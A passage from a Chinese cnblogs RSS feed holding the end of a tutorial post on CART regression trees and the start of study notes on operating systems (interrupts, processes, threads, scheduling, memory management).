-&lt;p&gt;常用的决策树有 ID3、C4.5、CART 等，其中 CART 就可以用来做回归问题，CART 全称就是 Classification And Regression Tree（分类和回归树）。至于 ID3 和 C4.5，能不能用来做回归问题，等了解完 CART 回归树再讨论。&lt;/p&gt;
-&lt;p&gt;接下来我们介绍将 CART 用于回归问题。&lt;/p&gt;
-&lt;h2 id=&quot;回归树&quot;&gt;回归树&lt;/h2&gt;
-&lt;p&gt;回归树（regression tree），顾名思义，就是用树模型做回归问题，每一片叶子都输出一个预测值。预测值一般是训练集中该片叶子所含元素输出的均值，即 &lt;span class=&quot;math inline&quot;&gt;\(c_{m} = ave(y_i | \bm x_i \in leaf_m)\)&lt;/span&gt;。&lt;/p&gt;
-&lt;p&gt;CART 在分类问题和回归问题中的相同和差异：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;相同：
-&lt;ul&gt;&lt;li&gt;在分类问题和回归问题中，CART 都是一棵二叉树，除叶子节点外的所有节点都有且仅有两个子节点；&lt;/li&gt;
-&lt;li&gt;所有落在同一片叶子中的输入都有同样的输出。&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;差异：
-&lt;ul&gt;&lt;li&gt;在分类问题中，CART 使用基尼指数（Gini index）作为选择特征（feature）和划分（split）的依据；在回归问题中，CART 使用 mse（mean square error）或者 mae（mean absolute error）作为选择 feature 和 split 的 criteria。&lt;/li&gt;
-&lt;li&gt;在分类问题中，CART 的每一片叶子都代表的是一个 class；在回归问题中，CART 的每一片叶子表示的是一个预测值，取值是连续的。&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;下面以 criteria = 'mse' 为例，介绍 CART 回归树。&lt;/p&gt;
-&lt;h3 id=&quot;理论解释&quot;&gt;理论解释&lt;/h3&gt;
-&lt;p&gt;给定一个数据集 &lt;span class=&quot;math inline&quot;&gt;\(D = \{(\bm x_1, y_1), (\bm x_2, y_2), ..., (\bm x_i, y_i), ...,(\bm x_n, y_n)\}\)&lt;/span&gt;，其中 &lt;span class=&quot;math inline&quot;&gt;\(\bm x_i\)&lt;/span&gt; 是一个 m 维的向量，即 &lt;span class=&quot;math inline&quot;&gt;\(x_i\)&lt;/span&gt; 含有 m 个 features。&lt;/p&gt;
-&lt;p&gt;回归问题的目标就是构造一个函数 &lt;span class=&quot;math inline&quot;&gt;\(f(\bm x)\)&lt;/span&gt; 能够拟合数据集 &lt;span class=&quot;math inline&quot;&gt;\(D\)&lt;/span&gt; 中的元素，使得 mse 最小，即：&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ \min \frac{1}{n} \sum_{i = 1}^{n} (f(\bm x_i) - y_i)^2 \tag{1} \]&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;用 CART 进行回归，目标自然也是一样的，最小化 mse。&lt;/p&gt;
-&lt;p&gt;假设一棵构建好的 CART 回归树有 &lt;span class=&quot;math inline&quot;&gt;\(M\)&lt;/span&gt; 片叶子，这意味着 CART 将输入空间 &lt;span class=&quot;math inline&quot;&gt;\(\bm x\)&lt;/span&gt; 划分成了 &lt;span class=&quot;math inline&quot;&gt;\(M\)&lt;/span&gt; 个单元 &lt;span class=&quot;math inline&quot;&gt;\(R_1, R_2, ..., R_M\)&lt;/span&gt;，同时意味着 CART 至多会有 &lt;span class=&quot;math inline&quot;&gt;\(M\)&lt;/span&gt; 个不同的预测值。CART 最小化 mse 公式如下：&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ \min \frac{1}{n} \sum_{m = 1}^{M}\sum_{\bm x_i \in R_m} (c_m - y_i)^2 \tag{2} \]&lt;/span&gt;&lt;br/&gt;其中，&lt;span class=&quot;math inline&quot;&gt;\(c_m\)&lt;/span&gt; 表示第 &lt;span class=&quot;math inline&quot;&gt;\(m\)&lt;/span&gt; 片叶子的预测值。&lt;br/&gt;想要最小化 CART 总体的 mse，只需要最小化每一片叶子的 mse 即可，而最小化一片叶子的 mse，只需要将预测值设定为叶子中含有的训练集元素的均值，即：&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ c_{m} = ave(y_i | \bm x_i \in leaf_m) \tag{3} \]&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;所以，在每一次的划分中，选择切分变量（splitting variable）和切分点（splitting point）时（也就是选择 feature 和将该 feature space 一分为二的 split），使得模型在训练集上的 mse 最小，也就是每片叶子的 mse 之和最小。&lt;/p&gt;
-&lt;p&gt;这里采用启发式的方法，遍历所有的切分变量和切分点，然后选出 &lt;em&gt;叶子节点 mse 之和最小&lt;/em&gt; 的那种情况作为划分。选择第 &lt;span class=&quot;math inline&quot;&gt;\(j\)&lt;/span&gt; 个 feature &lt;span class=&quot;math inline&quot;&gt;\(\bm x^{(j)}\)&lt;/span&gt; 和它取的值 &lt;span class=&quot;math inline&quot;&gt;\(s\)&lt;/span&gt;，作为切分变量和切分点，则切分变量和切分点将父节点的输入空间一分为二：&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ \begin{split} R_1\{j, s\} = \{\bm x| \bm x^{(j)} \le s\} \\ R_2\{j, s\} = \{\bm x| \bm x^{(j)} &amp;gt; s\} \end{split} \tag{4} \]&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;CART 选择切分变量 &lt;span class=&quot;math inline&quot;&gt;\(j\)&lt;/span&gt; 和 切分点 &lt;span class=&quot;math inline&quot;&gt;\(s\)&lt;/span&gt; 的公式如下：&lt;br/&gt;&lt;span class=&quot;math display&quot;&gt;\[ \min_{j, s} \left[\min_{c_1} \sum_{x_i \in R_1\{j, s\}} (y_i - c_1)^2 + \min_{c_2} \sum_{x_i \in R_2\{j, s\}} (y_i - c_1)^2 \right] \tag{5} \]&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;采取遍历的方式，我们可以将 &lt;span class=&quot;math inline&quot;&gt;\(j\)&lt;/span&gt; 和 &lt;span class=&quot;math inline&quot;&gt;\(s\)&lt;/span&gt; 找出来：先固定 feature &lt;span class=&quot;math inline&quot;&gt;\(j\)&lt;/span&gt; 再选出在该 feature 下的最佳划分 &lt;span class=&quot;math inline&quot;&gt;\(s\)&lt;/span&gt;；对每一个 feature 都这样做，那么有 &lt;span class=&quot;math inline&quot;&gt;\(m\)&lt;/span&gt; 个feature，我们就能得到 &lt;span class=&quot;math inline&quot;&gt;\(m\)&lt;/span&gt; 个 feature 对应的最佳划分，从这 &lt;span class=&quot;math inline&quot;&gt;\(m\)&lt;/span&gt; 个值中取最小值即可得到令全局最优的 &lt;span class=&quot;math inline&quot;&gt;\((j, s)\)&lt;/span&gt;。式（5）中，第一项 &lt;span class=&quot;math inline&quot;&gt;\(\min_{c_1} \sum_{x_i \in R_1\{j, s\}} (y_i - c_1)^2\)&lt;/span&gt; 得到的 &lt;span class=&quot;math inline&quot;&gt;\(c_1\)&lt;/span&gt; 值按照式（3）就是 &lt;span class=&quot;math inline&quot;&gt;\(ave(y_i | \bm x_i \in R_1\{j, s\})\)&lt;/span&gt;，同理，第二项中 &lt;span class=&quot;math inline&quot;&gt;\(c_2 = ave(y_i | \bm x_i \in R_2\{j, s\})\)&lt;/span&gt; 。&lt;/p&gt;
-&lt;h3 id=&quot;算法流程&quot;&gt;算法流程&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1351564/201904/1351564-20190417211629985-1738278490.png&quot; alt=&quot;最小二乘法回归树生成算法&quot;/&gt;&lt;/p&gt;
-&lt;h2 id=&quot;id3-和-c4.5-能不能用来回归&quot;&gt;ID3 和 C4.5 能不能用来回归？&lt;/h2&gt;
-&lt;p&gt;CART 是一棵二叉树，那么只要回归树不是一棵二叉树，那么就不是 CART 树了。&lt;/p&gt;
-&lt;p&gt;在分类问题中，ID3、C4.5 和 CART 的区别就在与划分子节点的策略不同，信息增益、增益比、基尼指数；而在回归问题中，criteria 是 mse 或者 mae，这种情况下，分类时的 ID3、C4.5、CART 之间的区别就没了，那么就是每个父节点划分成多少个子节点的问题了，如果还是二叉树，那么就认为是 CART 回归树，否则就不是了。&lt;/p&gt;
-&lt;p&gt;如果你在同一个时刻对某一个 feature &lt;span class=&quot;math inline&quot;&gt;\(\bm x^{(j)}\)&lt;/span&gt; 选择两个切分点 &lt;span class=&quot;math inline&quot;&gt;\(s_1\)&lt;/span&gt; 和 &lt;span class=&quot;math inline&quot;&gt;\(s_2\)&lt;/span&gt; 来划分父节点，那么就将产生三个区间 &lt;span class=&quot;math inline&quot;&gt;\(R_1\{j, s_1\}, R_2\{j, s_1, s_2\}, R_3\{j, s_2\}\)&lt;/span&gt;，这种做法无疑增大了遍历的难度，如果选择更多个切分点，那么遍历的难度会指数上升。如果我们想要细分多个区域，让 CART 回归树更深即可，这样遍历的难度会小很多。&lt;/p&gt;
-&lt;p&gt;所以，固然可以构建非 CART 回归树，但是不如 CART 回归树来的更简单。&lt;/p&gt;
-&lt;h2 id=&quot;回归树示例&quot;&gt;回归树示例&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&quot;https://scikit-learn.org/stable/auto_examples/tree/plot_tree_regression.html#sphx-glr-auto-examples-tree-plot-tree-regression-py&quot; target=&quot;_blank&quot;&gt;Decision Tree Regression -- scikit-learn&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&quot;https://github.com/wuliytTaotao/Learning-Materials/blob/master/machine%20leanring/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95.pdf&quot; target=&quot;_blank&quot;&gt;《统计学习方法》-- 李航&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://scikit-learn.org/stable/auto_examples/tree/plot_tree_regression.html#sphx-glr-auto-examples-tree-plot-tree-regression-py&quot; target=&quot;_blank&quot;&gt;Decision Tree Regression -- scikit-learn&lt;/a&gt;&lt;/p&gt;
-</description>
-<pubDate>Wed, 17 Apr 2019 14:18:00 +0000</pubDate>
-<dc:creator>wuliytTaotao</dc:creator>
-<og:description>决策树怎么处理回归问题，在 xgboost、lightGBM 大行其道的时候，了解什么是回归树是很有必要的。</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/wuliytTaotao/p/10724118.html</dc:identifier>
-</item>
-<item>
-<title>【重学计算机】计算机操作系统 - 闪客sun</title>
-<link>http://www.cnblogs.com/flashsun/p/10669879.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/flashsun/p/10669879.html</guid>
-<description>&lt;h2&gt;一、操作系统概述&lt;/h2&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. 计算机软硬件系统&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;冯诺伊曼结构&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;以运算单元为核心，控制流由指令流产生&lt;/li&gt;
-&lt;li&gt;程序和数据存储在主存中&lt;/li&gt;
-&lt;li&gt;主存是按地址访问，线性编址&lt;/li&gt;
-&lt;li&gt;指令由操作码和地址码组成&lt;/li&gt;
-&lt;li&gt;数据以二进制编码&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;其他&lt;/strong&gt;：参考&lt;a href=&quot;https://www.cnblogs.com/flashsun/p/10628433.html&quot; target=&quot;_blank&quot;&gt;《重学计算机-计算机组成原理》&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;2. 计算机操作系统的发展&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;概述&lt;/strong&gt;：任何一台机器都有其操作平台和操作系统
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;洗衣机&lt;/strong&gt;：开关表示、按钮控制、亮灯显示&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;演进过程&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;手工操作&lt;/strong&gt;：手动调动地址和数据按钮录入内存，然后点运行&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;引进装入程序&lt;/strong&gt;：用卡片和纸带，通过ROM上的装入程序载入内存
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;汇编语言&lt;/strong&gt;：对指令提供了助记符号&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;高级语言&lt;/strong&gt;：面向问题&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;简单批处理系统&lt;/strong&gt;：编写作业控制程序，缩短手工操作的时间&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;多道批处理系统&lt;/strong&gt;：排队执行作业，不能同时，也不能和计算机交互&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;分时系统、实时系统&lt;/strong&gt;：进程间切换，引入中断机制&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;通用操作系统&lt;/strong&gt;：同时具备以上功能&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;3. 不同视角下的操作系统&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;div&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;资源管理的角度&lt;/strong&gt;：&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;资源&lt;/strong&gt;：硬件资源（处理器、内存、外设），软件资源（数据、程序）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;例子&lt;/strong&gt;：驱动程序&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;共享&lt;/strong&gt;：资源独占、并发共享&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;分配&lt;/strong&gt;：静态、动态、抢占&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;程序控制的角度&lt;/strong&gt;：进程&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;操作方式的角度&lt;/strong&gt;：脱机、联机&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;人机交互的角度&lt;/strong&gt;：行命令、全屏幕控制、窗口界面、虚拟现实&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;程序接口的角度&lt;/strong&gt;：系统调用（陷入机制）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;系统结构的角度&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;OS构件&lt;/strong&gt;：内核、进程、线程、管程&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;设计概念&lt;/strong&gt;：模块化、层次化、虚拟化&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/div&gt;
-&lt;h2&gt;二、处理器管理&lt;/h2&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. 指令与处理器模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;指令执行周期&lt;/strong&gt;：取指、译码、执行&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;指令分类&lt;/strong&gt;（根据权限）
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;特权指令&lt;/strong&gt;：只能被操作系统内核使用（启动IO，置PC值）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;非特权指令&lt;/strong&gt;：所有程序都能使用&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;处理器模式&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;共有四种&lt;/strong&gt;：0内核模式，1系统调用，2共享库程序，3用户模式&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;一般来说&lt;/strong&gt;：只有0内核模式（能执行全部指令）和3用户模式（只能执行非特权指令）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;模式切换&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;用户模式 --&amp;gt; 内核模式（系统调用、异常、响应中断）&lt;/li&gt;
-&lt;li&gt;内核模式 --&amp;gt; 用户模式（中断返回指令）&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;2. 中断&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;概念：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;操作系统是&lt;strong&gt;中断驱动&lt;/strong&gt;的。即&lt;strong&gt;中断是激活操作系统的唯一方式&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;广义中断&lt;/strong&gt;：停止CPU正在执行的进程，转而执行中断处理程序，处理完后返回原进程或调度新进程&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;狭义中断&lt;/strong&gt;：源于处理器之外的中断事件，IO中断、时钟中断、外部信号中断&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;中断源：&lt;/strong&gt;&lt;br/&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;处理器硬件故障中断事件&lt;/strong&gt;：内存故障&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;程序性中断事件&lt;/strong&gt;：除0异常、缺页异常&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;自愿性中断事件&lt;/strong&gt;：系统调用&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;IO中断事件&lt;/strong&gt;：IO完成&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;外部中断事件&lt;/strong&gt;：鼠标点击&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;中断系统：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;实现&lt;/strong&gt;：硬件完成中断响应，软件完成中断处理&lt;/li&gt;
-&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190408124426906-894048566.png&quot; alt=&quot;&quot; width=&quot;450&quot; height=&quot;184&quot;/&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;中断装置&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;处理器外中断&lt;/strong&gt;：由中断控制器实现&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;处理器内中断（陷阱）&lt;/strong&gt;：由指令控制逻辑实现&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;系统调用（系统陷阱）&lt;/strong&gt;：执行陷入指令时直接触发，即系统陷阱&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;中断处理流程&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190408125743923-1038593711.png&quot; alt=&quot;&quot; width=&quot;454&quot; height=&quot;297&quot;/&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;多中断处理&lt;/strong&gt;：中断屏蔽、中断优先级、中断嵌套&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;3. 进程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;进程&lt;/strong&gt;：操作系统进行资源分配和调度的独立单位&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程解剖&lt;/strong&gt;：OS管理进程的数据结构P + 内存代码 + 内存数据 + 通用寄存器R + PSW&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程状态&lt;/strong&gt;：&lt;img id=&quot;uploading_image_22610&quot; src=&quot;https://common.cnblogs.com/images/loading.gif&quot; alt=&quot;&quot;/&gt;&lt;/li&gt;
-&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190410165902943-787863351.png&quot; alt=&quot;&quot; width=&quot;267&quot; height=&quot;258&quot;/&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程数据&lt;/strong&gt;：
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;进程控制块PCB&lt;/strong&gt;：是OS用于记录进程状态和环境信息的数据结构
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;标识信息&lt;/strong&gt;：进程标识（进程标识号、进程组标识号）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;现场信息&lt;/strong&gt;：用户可见寄存器内容、控制/状态寄存器内容、栈指针内容&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;控制信息&lt;/strong&gt;：进程调度信息、进程组成信息、队列指引元、通信相关、进程特权信息、处理器使用信息、资源清单信息&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程映像&lt;/strong&gt;：某一时刻进程的内容及执行状态集合
-&lt;ul&gt;&lt;li&gt;进程控制块、进程程序块、进程数据块、核心栈&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190410171213833-1620349719.png&quot; alt=&quot;&quot; width=&quot;381&quot; height=&quot;230&quot;/&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程上下文&lt;/strong&gt;：进程执行的环境支持（CPU现场、Cache中的执行信息）
-&lt;ul&gt;&lt;li&gt;用户级、寄存器级、系统级&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程的管理&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;进程实现的队列模型&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190410171731621-1382013489.png&quot; alt=&quot;&quot; width=&quot;462&quot; height=&quot;278&quot;/&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程控制流程&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;进程创建&lt;/strong&gt;：进程表增加一项，申请PCB并初始化，生成标识，建立映像，分配资源，移入就绪队列&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程撤销&lt;/strong&gt;：从队列中移除，归还响应资源。。。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程阻塞&lt;/strong&gt;：保存现场，修改PCB，移入等待队列&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程唤醒&lt;/strong&gt;：从等待队列移出，修改PCB，进入就绪队列&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程挂起&lt;/strong&gt;：修改进程状态并出入相关队列，收回内存等资源送至对换区&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程激活&lt;/strong&gt;：分配内存，修改状态并出入相关队列&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;原语&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;概念&lt;/strong&gt;：由若干指令构成的完成某种特定功能，有原子性&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;应用&lt;/strong&gt;：修改OS核心数据结构（进程表、PCB池）&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;进程切换与模式切换&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;流程&lt;/strong&gt;： 俩进程上下文切换（保存被中断的上下文、进程调度、恢复待运行的上下文）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;模式切换&lt;/strong&gt;：用户态到内核态这种。进程切换必须在内核态完成，所以必须经理模式切换&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;4. 线程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;多线程技术：&lt;/strong&gt;一个进程内有多个线程&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;思路：&lt;/strong&gt;将进程的两个功能“独立分配资源”和“调度执行”功能分开&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190410190302649-718946099.png&quot; alt=&quot;&quot; width=&quot;287&quot; height=&quot;196&quot;/&gt;  &lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190410190352629-1511737999.png&quot; alt=&quot;&quot; width=&quot;463&quot; height=&quot;239&quot;/&gt; &lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;分类：&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;KLT：&lt;/strong&gt;内核级多线程&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;ULT：&lt;/strong&gt;用户级别多线程&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;多线程实现的混合策略&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;一个ULT绑定多个KLT&lt;/li&gt;
-&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190410191107959-687687197.png&quot; alt=&quot;&quot; width=&quot;545&quot; height=&quot;332&quot;/&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;5. 处理器调度&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;div&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;处理器调度的层次：&lt;/strong&gt;高级、中级、低级&lt;/li&gt;
-&lt;li&gt;
-&lt;ul&gt;&lt;li&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1096103/201904/1096103-20190410191432871-2005639753.png&quot; alt=&quot;&quot; width=&quot;444&quot; height=&quot;232&quot;/&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;处理器调度算法&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;原则&lt;/strong&gt;：资源利用率、响应时间、周转时间（进入系统到出系统时间）、吞吐量（单位时间处理进程数）、公平性&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;算法&lt;/strong&gt;：优先数算法、时间片轮转、分级调度算法、彩票算法&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/div&gt;
-&lt;h2&gt;三、存储管理&lt;/h2&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. 存储管理的基本概念&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;逻辑地址：&lt;/strong&gt;用户地址，从零开始编号
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;一维逻辑地址&lt;/strong&gt;：(地址)&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;二维逻辑地址&lt;/strong&gt;：(段号: 段内地址)&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;主存储器的复用方式&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;按分区&lt;/strong&gt;：主存划分为多个固定/可变分区，一个程序占一个分区&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;按页架&lt;/strong&gt;：主存划分为多个固定页架，一个程序占多个页架&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;存储管理的模式&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;单连续&lt;/strong&gt;：一维逻辑地址程序，占一个固定/可变分区&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;段   式&lt;/strong&gt;：二维逻辑地址程序，占多个可变分区&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;页   式&lt;/strong&gt;：一维逻辑地址程序，占多个页架&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;段页式&lt;/strong&gt;：二维逻辑地址程序，占多个页架&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;地址转换&lt;/strong&gt;：逻辑地址 --&amp;gt; 物理地址
-&lt;ul&gt;&lt;li&gt;&lt;strong&gt;静态重定位&lt;/strong&gt;：程序装入内存时转换（早期OS）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;动态重定位&lt;/strong&gt;：CPU执行时转换，效率考虑需要硬件帮助&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;虚拟存储器&lt;/strong&gt;
-&lt;ul&gt;&lt;li&gt;由于程序的局部性顺序性等，可以考虑只将部分程序调入主存，其他的随用随调&lt;/li&gt;
-&lt;li&gt;达到了面对程序员主存扩容的目的&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
